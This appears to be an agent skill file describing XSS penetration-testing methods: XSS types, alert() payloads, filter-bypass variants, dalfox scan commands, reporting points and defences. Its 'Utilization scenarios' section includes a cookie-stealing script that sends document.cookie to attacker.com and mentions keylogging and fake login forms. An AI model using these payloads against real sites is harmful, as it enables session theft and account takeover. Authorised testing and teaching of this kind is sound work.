---
name: xss-testing
Description: Professional skills in XSS cross-site scripting attack testing
version: 1.0.0
---

# XSS testing skills

## Overview

Cross-site scripting (XSS) attacks allow attackers to execute malicious JavaScript code in the victim's browser. This skill covers testing methods for reflected, stored and DOM XSS.

## XSS types

### 1. Reflected XSS
- Malicious scripts passed via URL parameters
- The server directly returns a response containing the script
- Requires users to click on malicious links

### 2. Stored XSS (Stored XSS)
- Malicious scripts are stored on the server (database, files, etc.)
- The script will be executed by all users who visit the affected page
- Wider scope of influence

### 3. DOM-based XSS
- Client-side JavaScript improperly handles user input
- No server-side processing involved
- Triggered by modifying the DOM structure

## Test method

### Basic Payload
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### Bypass filtering

#### Case bypass
```javascript
<ScRiPt>alert('XSS')</ScRiPt>
```

#### Encoding bypass
```javascript
%3Cscript%3Ealert('XSS')%3C/script%3E
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

#### Event handler
```javascript
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<div onmouseover=alert('XSS')>hover</div>
<input onfocus=alert('XSS') autofocus>
```

#### Pseudo protocol
```javascript
<a href="javascript:alert('XSS')">click</a>
<iframe src="javascript:alert('XSS')">
```

### Advanced Bypass Techniques

#### Use String.fromCharCode
```javascript
<script>alert(String.fromCharCode(88,83,83))</script>
```

#### Use eval and atob
```javascript
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```

#### Using HTML entities
```javascript
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

## Tool usage

### dalfox
```bash
#Basic scan
dalfox url "http://target.com/page?q=test"

# Specify parameters
dalfox url "http://target.com/page" -d "q=test" -X POST

# Use custom payload
dalfox url "http://target.com/page?q=test" --custom-payload payloads.txt
```

### Burp Suite
- Use Intruder module for batch testing
- Manual testing using Repeater
- Automatic detection using Scanner

### Browser console
- Test for DOM-type XSS
- Check JavaScript execution environment
- Debug payload

## Verification and Exploitation

### Verification steps
1. Confirm that the payload is executed
2. Check whether it is filtered or encoded
3. Test different contexts (HTML, JavaScript, attributes, etc.)
4. Assess the impact (Cookie theft, session hijacking, etc.)

### Utilization scenarios
- Cookie窃取：`<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
- Keylogger: Inject keyboard event listener
- Phishing attack: fake login form
- Session hijacking: Obtain user session token

## Report points

- XSS type (reflection/storage/DOM)
- Trigger positions and parameters
- Complete POC
- Impact assessment
- Fix suggestions (output encoding, CSP strategy, etc.)

## Protective measures

- Input validation and filtering
- Output encoding (HTML, JavaScript, URL)
- Content Security Policy (CSP)
- HttpOnly Cookie flag
- Use safe frameworks and libraries
